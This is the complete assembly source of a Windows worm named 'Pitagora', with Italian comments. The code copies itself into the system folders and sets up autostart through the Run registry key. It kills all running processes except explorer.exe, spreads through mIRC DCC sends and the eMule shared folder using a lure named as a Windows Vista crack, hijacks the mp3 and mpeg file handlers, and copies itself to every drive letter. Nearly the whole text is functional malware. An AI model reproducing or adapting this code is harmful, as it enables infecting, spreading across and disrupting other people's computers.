;;; un piccolo worm in assembler ... (cazzuto ma non troppo :-))
.586
.model flat
;;;; API NECESSARIE ! ;;;;
extrn ExitProcess:PROC
extrn ShellAboutA:PROC
extrn CopyFileA:PROC
extrn GetCommandLineA:PROC
extrn lstrcpy:PROC
extrn lstrlen:PROC 
extrn lstrcat:PROC
extrn GetWindowsDirectoryA:PROC
extrn GetSystemDirectoryA:PROC
extrn RegOpenKeyA:PROC
extrn RegSetValueExA:PROC
extrn RegSetValueA:PROC
extrn RegCloseKey:PROC
extrn RegQueryValueExA:PROC
extrn CreateFileA:PROC
extrn CloseHandle:PROC
extrn CreateThread:PROC
extrn Sleep:PROC
extrn WriteFile:PROC
extrn CreateMutexA:PROC
extrn GetLastError:PROC
extrn CreateToolhelp32Snapshot:PROC
extrn Process32First:PROC
extrn Process32Next:PROC
extrn GetCurrentProcessId:PROC
extrn OpenProcess:PROC
extrn TerminateProcess:PROC
extrn lstrcmpi:PROC
;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;; Costanti ;;;;
MAX_PATH equ 260
HKEY_LOCAL_MACHINE  equ 80000002h
HKEY_CURRENT_USER   equ 80000001h
REG_SZ              equ 1
OPEN_EXISTING       equ 3
CREATE_NEW          equ 1
CREATE_ALWAYS       equ 2
GENERIC_READ        equ 80000000h
GENERIC_WRITE       equ 40000000h
FILE_SHARE_READ     equ 1
FILE_SHARE_WRITE    equ 2
ERROR_ALREADY_EXISTS equ 183
PROCESS_ALL_ACCESS equ 00000000h
;;;;;;;;;;;;;;;;;;
.data
;;;; Variabili e MsgS ;;;;
MyPath db 260 dup(?)
WinPATH db 260 dup(?)
SysPATH db 260 dup(?)
WormName1 db "\sys.exe",0
WormName2 db "\mon.exe",0
StartUpKey db "Software\Microsoft\Windows\CurrentVersion\Run", 0
CheckFile db "\Pitagora.teo",0
CheckFilePath db 260 dup(?)
KeyName db "SystemMonitor",0
Msg db "You have been infected by Pitagora !!! by WarGame !!!!",0
Titolo db "Is the war right ???? Think about this ...",0
HKey dd 00000000h
Tid dd 00000000h
CopyName db "C:\AVG-Antivirus.exe",0
MSG_Interno db "Anti Soviet and Anti American !!!",0
Drive db 'C'
MircPath db 260 dup(?)
MircKey db "Software\Microsoft\Windows\CurrentVersion\Uninstall\mIRC",0
MircKeyName db "UninstallString",0
EmuleKey db "Software\eMule",0
EmuleKeyName db "Install Path",0
EmuleWorm db "\Incoming\WINDOWS_VISTA_CRACK.exe",0
EmulePath db 260 dup (?)
BufLen dd 260
ScriptIni db "script.ini",0
MIRCWORM db "[Script]",0dh,0ah ,"n0=on 1:join:#: { if ( $nick == $me ) halt",0dh,0ah ,"n1=else /dcc send $nick WINDOWS_VISTA_CRACK_CHANGE_MY_EXSTENSION_TO_EXE_TO_GO.txt",0
MP3Key1 db "SOFTWARE\Classes\mp3file\shell\open\command",0
MP3Key2 db "SOFTWARE\Classes\mp3file\shell\play\command",0
MPEGKey1 db "SOFTWARE\Classes\mpegfile\shell\open\command",0
MPEGKey2 db "SOFTWARE\Classes\mpegfile\shell\play\command",0
FD dd 00000000h
Scritti dd 00000000h
OpenMe_Path db 260 dup(?)
OpenMe db "WINDOWS_VISTA_CRACK_CHANGE_MY_EXSTENSION_TO_EXE_TO_GO.txt",0
MUT db "WOOWOO",0
MSGPayLoad db "!!!! AH...AH...this is for Pitagora ... I am Italian and you? !!!!",0
;;;;;;;;;;;;;;;;;;;
Snap dd 00000000h
TH32CS_SNAPPROCESS EQU  00000002h
PROCESS_TERMINATE equ 00000001h
PROCESSENTRY32 struct
dwSize               DD    0
cntUsage             DD    0
th32ProcessID        DD    0          
th32DefaultHeapID    DD    0 
th32ModuleID         DD    0          
cntThreads           DD    0
th32ParentProcessID  DD    0   
pcPriClassBase       DD    0         
dwFlags              DD    0
szExeFile            DB  MAX_PATH DUP(0)  
PROCESSENTRY32 ends
prentry PROCESSENTRY32 <>
MyID dd 00000000h
EX db "explorer.exe",0
p_RET dd 00000000h
;;;;;;;;;;;;;;;;;;;
.code
Pitagora:
Sono_Solo:
        push offset MUT
        push 00000001h
        push 00000000h
        call CreateMutexA
        call GetLastError
        cmp eax,ERROR_ALREADY_EXISTS
        je Esci
Ottieni_path:
        call GetCommandLineA
        push eax
        push offset MyPath
        call lstrcpy
        push offset MyPath
        call lstrlen
        xor ebx,ebx
        mov [MyPath+eax-2],bh
        push offset [MyPath+1]
        push offset MyPath
        call lstrcpy
Ottieni_path_OS:
        push 260
        push offset WinPATH
        call GetWindowsDirectoryA
        push offset WinPATH
        push offset CheckFilePath
        call lstrcpy
        push 260
        push offset SysPATH
        call GetSystemDirectoryA
Crea_Path_Worms:
        push offset WormName1
        push offset WinPATH
        call lstrcat
        push offset WormName2
        push offset SysPATH
        call lstrcat
Anti_AntiVirus:
        call FuckAV ; ... termina i processi non graditi ...
Controlla_Se_Infetto:
        push offset CheckFile
        push offset CheckFilePath
        call lstrcat
        push 00000000h
        push 00000000h
        push OPEN_EXISTING
        push 00000000h
        push FILE_SHARE_READ
        push GENERIC_READ
        push offset CheckFilePath
        call CreateFileA
        cmp eax,-1
        jne Worming
        push 00000000h
        push 00000000h
        push CREATE_NEW
        push 00000000h
        push FILE_SHARE_WRITE
        push GENERIC_WRITE
        push offset CheckFilePath
        call CreateFileA
        push eax
        call CloseHandle
Copia_file:  
        push 00000000h
        push offset WinPATH
        push offset MyPath
        call CopyFileA
        push 00000000h
        push offset SysPATH
        push offset MyPath
        call CopyFileA
StartupAutomatico:
        push offset HKey
        push offset StartUpKey
        push HKEY_LOCAL_MACHINE
        call RegOpenKeyA
        cmp eax,0
        jne Esci
        push offset SysPATH
        call lstrlen
        mov ebx,1
        add eax,ebx
        push eax
        push offset SysPATH
        push REG_SZ
        push 00000000h 
        push offset KeyName
        push HKey
        call RegSetValueExA
        push HKey
        call RegCloseKey
Esci:
        push 00000000h
        push offset Msg
        push offset Titolo
        push 00000000h
        call ShellAboutA
        xor edx,edx
        push edx
        call ExitProcess
Worming: 
       push eax
       call CloseHandle
INFETTA_MIRC:
        push offset HKey
        push offset MircKey
        push HKEY_LOCAL_MACHINE
        call RegOpenKeyA
        cmp eax,0
        jne INFETTA_EMULE
        push offset BufLen
        push offset MircPath
        push 00000000h
        push 00000000h
        push offset MircKeyName
        push HKey
        call RegQueryValueExA
        cmp eax,0 
        jne INFETTA_EMULE
        push HKey
        call RegCloseKey
        push offset [MircPath+1]
        push offset [MircPath]
        call lstrcpy
        push offset MircPath
        xor ecx,ecx
Fuck:
        cmp byte ptr[MircPath+ecx],'"'
        je OK
        inc ecx
        jmp Fuck
OK: 
        xor ebx,ebx
        mov [MircPath+ecx],bh
        xor ecx,ecx
Fuck2:
        cmp byte ptr[MircPath+ecx],'.'
        je OK2
        inc ecx
        jmp Fuck2
OK2:
        xor ebx,ebx
        mov [MircPath+ecx-4],bh
        push offset MircPath
        push offset OpenMe_Path
        call lstrcpy
        push offset OpenMe
        push offset OpenMe_Path
        call lstrcat
        push offset ScriptIni
        push offset MircPath 
        call lstrcat
        push 00000000h
        push 00000000h
        push CREATE_ALWAYS
        push 00000000h
        push FILE_SHARE_WRITE
        push GENERIC_WRITE
        push offset MircPath
        call CreateFileA
        cmp eax,-1
        je INFETTA_EMULE
        mov FD,eax
        push 00000000h
        push offset Scritti 
        push offset MIRCWORM  
        call lstrlen
        push eax
        push offset MIRCWORM
        push FD
        call WriteFile
        push FD
        call CloseHandle
        push offset MircPath
        call lstrlen 
        push offset [MircPath+eax-11]
        push offset MircPath
        call lstrcpy
        push 00000000h
        push offset OpenMe_Path
        push offset MyPath
        call CopyFileA
INFETTA_EMULE:
        push offset HKey
        push offset EmuleKey
        push HKEY_CURRENT_USER
        call RegOpenKeyA
        cmp eax,0
        jne MP3_FUCKING
        push offset BufLen
        push offset EmulePath
        push 00000000h
        push 00000000h
        push offset EmuleKeyName
        push HKey
        call RegQueryValueExA
        cmp eax,0 
        jne MP3_FUCKING 
        push offset EmuleWorm
        push offset EmulePath
        call lstrcat
        push 00000000h
        push offset EmulePath
        push offset MyPath
        call CopyFileA
MP3_FUCKING:
        push offset HKey
        push offset MP3Key1
        push HKEY_LOCAL_MACHINE
        call RegOpenKeyA
        cmp eax,0
        jne MPEG_FUCKING
        push offset WinPATH
        call lstrlen
        push eax
        push offset WinPATH
        push REG_SZ
        push 00000000h
        push HKey
        call RegSetValueA
        push HKey
        call RegCloseKey   
        push offset HKey
        push offset MP3Key2
        push HKEY_LOCAL_MACHINE
        call RegOpenKeyA
        cmp eax,0
        jne MPEG_FUCKING
        push offset WinPATH
        call lstrlen
        push eax
        push offset WinPATH
        push REG_SZ
        push 00000000h
        push HKey
        call RegSetValueA
        push HKey
        call RegCloseKey
MPEG_FUCKING:
        push offset HKey
        push offset MPEGKey1
        push HKEY_LOCAL_MACHINE
        call RegOpenKeyA
        cmp eax,0
        jne Vai
        push offset WinPATH
        call lstrlen
        push eax
        push offset WinPATH
        push REG_SZ
        push 00000000h
        push HKey
        call RegSetValueA
        push HKey
        call RegCloseKey   
        push offset HKey
        push offset MPEGKey2
        push HKEY_LOCAL_MACHINE
        call RegOpenKeyA
        cmp eax,0
        jne Vai
        push offset WinPATH
        call lstrlen
        push eax
        push offset WinPATH
        push REG_SZ
        push 00000000h
        push HKey
        call RegSetValueA
        push HKey
        call RegCloseKey
Vai:
       push offset Tid
       push 00000000h
       push 00000000h
       push offset Copiati
       push 00000000h
       push 00000000h
       call CreateThread
       push offset Tid
       push 00000000h
       push 00000000h
       push offset PayLoad
       push 00000000h
       push 00000000h
       call CreateThread
Dormi:
       push 186a0h
       call Sleep
       xor ecx,ecx
       cmp ecx,0
       je Dormi
;;;; Thread di autocopia ;;;;
Copiati PROC
Copia:  
         mov ch,'C'
         mov Drive,ch
         mov [CopyName+0],ch 
         xor ebx,ebx
Tutti_I_drives:
         push 00000000h
         push offset CopyName
         push offset MyPath
         call CopyFileA
         push 4e20h
         call Sleep
         add Drive,1
         mov ch,Drive
         mov [CopyName+0],ch
         cmp ch,'Z'+1
         jne Tutti_I_drives
         cmp ebx,0
         je Copia
Copiati ENDP
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;; PayLoad ;;;;
PayLoad PROC
      Loop:
         xor ecx,ecx
         push 1200000
         call Sleep
         push 00000000h
         push offset MSGPayLoad
         push offset Titolo
         push 00000000h
         call ShellAboutA
         cmp ecx,0
         je Loop
PayLoad ENDP
;;;;;;;;;;;;;;;;;
FuckAV PROC
    My_ID:
          call GetCurrentProcessId
          mov MyID,eax
     Inializza:
               push 00000000h
               push TH32CS_SNAPPROCESS	
               call CreateToolhelp32Snapshot
               cmp eax,-1
               je Ritorna
               mov Snap,eax
    Primo:
               push offset prentry
               push Snap
               mov prentry.dwSize,296
               call Process32First
               cmp eax,0 
               je Ritorna
    Altri:
                push offset prentry
               push Snap
               mov prentry.dwSize,296
               call Process32Next
               mov p_RET,eax
    Controlla_se_explorer:
               push offset prentry.szExeFile
               push offset EX
               call lstrcmpi
               cmp eax,0
               je Ancora
    Controlla_id:
               mov edx,MyID
               cmp edx,prentry.th32ProcessID  
               je Ancora
    Termina: 
               push dword ptr[prentry.th32ProcessID]
               push 00000000h
               push PROCESS_TERMINATE
               call OpenProcess
               push 00000000h
               push eax
               call TerminateProcess
   Ancora:       
        cmp p_RET,0
               jne Altri
     Ritorna:
               ret
FuckAV ENDP
;;;;;;;;;;;;;;;;;
end Pitagora